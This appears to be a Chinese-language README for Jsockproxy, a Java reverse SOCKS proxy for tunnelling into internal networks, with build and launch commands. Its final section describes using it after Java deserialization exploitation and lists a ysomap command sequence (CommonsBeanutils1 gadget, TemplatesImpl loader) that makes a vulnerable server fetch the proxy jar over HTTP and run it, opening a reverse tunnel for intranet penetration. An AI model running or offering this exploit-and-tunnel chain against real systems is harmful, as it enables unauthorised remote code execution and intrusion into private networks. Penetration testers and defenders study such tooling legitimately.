# 概述

Jsockproxy是Java版反向socks代理，适用于内网穿透。

# 编绎
```
mvn clean package -DskipTests
```

# 启动

## 服务端（部署在VPS）

```
java -cp target/jsockproxy.jar jsockproxy.server.ProxyServerApp -ssl false -serverPort VPS服务器端口 -token 123456
```

## 客户端（内网服务器）

```
java -cp target/jsockproxy.jar jsockproxy.client.ProxyClientApp -ssl false -token 123456 -trunnelHost VPS服务器IP -trunnelPort VPS服务器端口 -groups test -serverFrontPorts VPS服务器代理端口
```

# 备注

## 直接默认配置启动

这场景主要是Java反序列化场景下，远程加载jar文件，按照默认配置，向服务端建立起反向代理，并进行内网渗透的场景：

## 使用前

```
// 修改下面代码中默认配置，具体看注释
jsockproxy.server.ProxyServerApp
jsockproxy.client.ProxyClientApp

// 编译
mvn clean package -DskipTests
```

## 服务端（部署在VPS）

```
java -cp target/jsockproxy.jar jsockproxy.server.ProxyServerApp
```
## Java 反序列化漏洞测试，例如使用[ysomap](https://github.com/wh1t3p1g/ysomap)

```
java -jar cli/target/ysomap.jar cli
use exploit LDAPLocalChainListener
use payload CommonsBeanutils1
use bullet TemplatesImplBullet
set lport 1389
set type loader
set effect RemoteFileHttpLoader
set body "http://127.0.0.1/jsockproxy.jar;jsockproxy.client.ProxyClientStart"
run
```
